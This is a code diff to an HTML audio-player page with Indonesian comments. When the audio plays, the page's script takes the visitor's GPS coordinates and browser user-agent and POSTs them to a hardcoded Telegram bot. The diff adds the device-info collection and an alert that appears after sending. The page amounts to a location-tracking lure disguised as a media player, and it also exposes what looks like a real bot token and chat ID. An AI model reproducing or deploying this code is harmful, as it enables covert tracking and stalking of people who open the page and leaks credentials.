@@ -24,34 +24,49 @@
 <body>
     <!-- Elemen audio untuk memutar suara -->
     <audio id="audio" controls autoplay>
-        <source src="basuri.mp3" type="audio/mp3"> <!-- Ganti dengan path file audio Anda -->
+        <source src="path/to/your/audio/file.mp3" type="audio/mp3"> <!-- Ganti dengan path file audio Anda -->
         Your browser does not support the audio tag.
     </audio>
+
+    <!-- Keterangan perangkat yang memutar audio -->
+    <p id="deviceInfo"></p>
 
     <!-- JavaScript Code -->
     <script>
         var audio = document.getElementById('audio');
+        var deviceInfo = document.getElementById('deviceInfo');
 
         audio.addEventListener('play', function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation);
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    sendLocation(position, navigator.userAgent);
+                });
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
         });
 
-        function sendLocation(position) {
+        function sendLocation(position, userAgent) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             var botToken = '7031438159:AAH_a-jwfpbSX2wBAmwcwvHKX4zykG3KLcY'; // Ganti dengan token bot Anda
             var chatId = '1456678907'; // Ganti dengan chat ID grup atau pengguna Anda
 
-            // Kirim lokasi ke Bot Telegram menggunakan HTTP POST
+            // Kirim lokasi dan keterangan perangkat ke Bot Telegram menggunakan HTTP POST
             var xhr = new XMLHttpRequest();
             xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendLocation', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({ chat_id: chatId, latitude: latitude, longitude: longitude }));
+
+            var message = {
+                chat_id: chatId,
+                latitude: latitude,
+                longitude: longitude,
+                text: 'Device Info: ' + userAgent
+            };
+
+            xhr.send(JSON.stringify(message));
             
+            alert("Lokasi GPS Anda beserta keterangan perangkat telah dikirim ke bot Telegram.");
         }
     </script>
 </body>
